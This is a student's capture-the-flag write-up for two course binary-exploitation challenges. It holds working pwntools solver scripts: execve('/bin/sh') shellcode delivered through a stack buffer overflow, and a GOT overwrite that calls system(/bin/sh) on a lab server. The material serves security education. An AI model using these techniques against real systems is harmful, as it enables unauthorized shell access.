---
tags:
  - offsec
---
_by Vaughn Valle_
## Writeups

### Number
The program, when run, asks us for a two inputs
![[Pasted image 20241119034855.png]]
#### Static Analysis with Binja
Upon inspection in Binja, we see the following lines in `main()`
![[Pasted image 20241119034428.png]]
We see two `fgets()` and a `print_answer()` call. Also note that `print_answer()` basically prints whatever we had in our 2nd input (`second`)
![[Pasted image 20241119035023.png]]
Adding variable names for simplicity
![[Pasted image 20241119040451.png]]
![[Pasted image 20241119035516.png]]
#### Shellcode Exploit
Now we can trigger unexpected behavior by injecting shellcode to the first prompt using `asm`.
```python
assembly_payload = [
"xor rax, rax",
"push rax",
"mov rbx, 0x68732f6e69622f",
"push rbx",
"mov rdi, rsp",
"push rax",
"push rdi",
"mov rsi, rsp",
"mov al, 0x3b",
"syscall"
]

```
Recall that in `main`, the `print_answer` function had `second` as an argument. If we can overflow its buffer and redirect it to the memory address of `first`, we can make it execute our injected shellcode from the previous step!

Now all we need is to figure out what the address of `first` is by checking the stack of `main()`
![[Pasted image 20241119040405.png]]

Knowing that the `second` buffer is `0x20-0x8`, it's buffer is 24 bytes. This is the size we will use for [[BOF]]
#### Solution
Hence, we can construct the ff. solver script with `pwntools`
```python
from pwn import *

local = False
binary = './number'

if not local:
    conn = remote('offsec-chalbroker.osiris.cyber.nyu.edu', 1291)
    conn.recvuntil(b':')
    conn.sendline('vqv9731')
else:
    conn = process(binary)

context.arch = "amd64"

conn.recvuntil(b'0x')
catch = conn.recvuntil(b' ')[:-1].decode()

# get address of leak + 0x8 to get to first
address = int.from_bytes(bytes.fromhex(catch), byteorder='big') + 0x8


assembly_payload = [
"xor rax, rax",
"push rax",
"mov rbx, 0x68732f6e69622f",
"push rbx",
"mov rdi, rsp",
"push rax",
"push rdi",
"mov rsi, rsp",
"mov al, 0x3b",
"syscall"
]

# concatenate and pack assembly commands to byte payload
bytes_assembly = b""
for command in assembly_payload:
    bytes_assembly += asm(command)

conn.recvuntil(b'>')
conn.sendline(bytes_assembly)

payload = b'A' * 24 + p64(address)

conn.recvuntil(b'>')
conn.sendline(payload)

conn.interactive()
```
### Email
Running the program, we see that it asks for 3 inputs
![[Pasted image 20241119042033.png]]

Interestingly, these inputs led to a segmentation fault

#### Static Analysis in Binja
First we inspect the `main()` function
![[Pasted image 20241119041301.png]]
![[Pasted image 20241119041314.png]]
Not much is unusual here other than the `send` function that seems to be defined
![[Pasted image 20241119041534.png]]
However, we can see here that this function basically assigns the the pointer `arg2` to `arg1`. Hence, we can potentially overwrite GOT entries and redirect to shell.

Recall that in main, we have 3 main inputs: `to`, `subject`, `message`
![[Pasted image 20241119043030.png]]
And that `send()` function has `rdi` and `rsi_3` as arguments both of which are tied to `message` and `subject` being copied for some reason

![[Pasted image 20241119043529.png]]
#### Switching to IDA
I don't really like how Binja decompiles `main()`. It is very convoluted and has a lot of variable assignments going on which makes it hard to understand. Switching to IDA, we can see a much more linear process
![[Pasted image 20241119044543.png]]
Here we can see that `to` is being split in half (`buf[0]` and `buf[1]`).
Looking at `send()` function in IDA:
![[Pasted image 20241119044712.png]]
The first half takes `message` as its input while the second half takes `subject`

$\therefore$ having `system() + puts()`, `cat flag.txt`, `/bin/sh`, as our inputs basically results as
```python
system(/bin/sh)
```
```bash
$ cat flag.txt
```

Now we just need the memory addresses of `_system` and `_puts` to do these operations.

![[Pasted image 20241119050228.png]]
![[Pasted image 20241119050153.png]]
Both are located at `0x4010e0` and `0x404020` respectively
#### Solution
We can create our solution script as such:
```python
from pwn import *

local = False
binary = './email'

if not local:
    conn = remote('offsec-chalbroker.osiris.cyber.nyu.edu', 1295)
    conn.recvuntil(b':')
    conn.sendline('vqv9731')
else:
    conn = process(binary)

context.arch = "amd64"

system = 0x4010e0
puts = 0x404020

conn.recvuntil(b': ')

payload = p64(system) + p64(puts)
conn.sendline(payload)

conn.recvuntil(b': ')

payload = b'cat flag.txt'
conn.sendline(payload)

conn.recvuntil(b': ')

payload = b'/bin/sh'
conn.sendline(payload)

conn.interactive()
```

> [!important]
> Binja really did a bad job of decompiling the `main()` function on this one. I will probably turn to IDA Free as my default as it's in the [AUR](https://aur.archlinux.org/packages/ida-free) anyway. The Binja decompilation took a lot of time off of me looking through what `main()` did with all the different variable assignments.